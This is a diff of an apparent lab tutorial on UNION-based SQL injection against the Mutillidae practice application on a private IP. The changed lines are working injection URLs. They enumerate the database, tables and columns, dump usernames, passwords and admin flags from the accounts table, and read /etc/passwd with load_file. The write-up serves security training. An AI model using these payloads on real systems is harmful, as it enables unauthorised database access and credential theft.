@@ -92,7 +92,7 @@ Instead of using the "order by" option, let’s use the "union select" option an
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 ![Screenshot 2024-05-10 190129](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/8fa8d5a7-6ad5-47ab-8a78-d4a5f887504d)
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
-http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,database(),user(),version(),5%23&password=vino1234&user-info-php-submit-button=View+Account+Details
+http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,database(),user(),version(),5%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
 
 ![Screenshot 2024-05-10 190425](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/ecdea388-621c-4dc7-99c0-7930a7ea9bf8)
 
@@ -103,7 +103,7 @@ Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 
-http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=vino1234&user-info-php-submit-button=View+Account+Details
+http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
 ![Screenshot 2024-05-10 192136](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/03faa153-61f5-4862-9d36-5349a4a7567b)
 
 The url once executed will  retrieve table names from the “owasp 10” database.
@@ -117,7 +117,7 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 
 Here we are trying to extract column names from the “accounts” table.
 The column names of the accounts is displayed below for the following url:
-http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=vino1234&user-info-php-submit-button=View+Account+Details 
+http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=balaji1234&user-info-php-submit-button=View+Account+Details 
 
 ![Screenshot 2024-05-10 192427](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/1e600e4e-cc24-46c4-97d4-85dafc37e5ad)
 
@@ -127,7 +127,7 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=vino1234&user-info-php-submit-button=View+Account+Details
+http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
 
 
 ![Screenshot 2024-05-10 192621](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/1ce121ab-3ac3-41dc-974d-e9ae64532695)
@@ -136,7 +136,7 @@ http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini
 We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
-http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=vinothini%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=vino1234&user-info-php-submit-button=View+Account+Details
+http://192.168.197.62/mutillidae/index.php?page=user-info.php&username=balaji%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=balaji1234&user-info-php-submit-button=View+Account+Details
 
 ![Screenshot 2024-05-10 192735](https://github.com/yashvanthbalaji/sqlinjection/assets/145736316/a224d1dc-c4a9-46eb-9dbe-934202d5eeea)
 
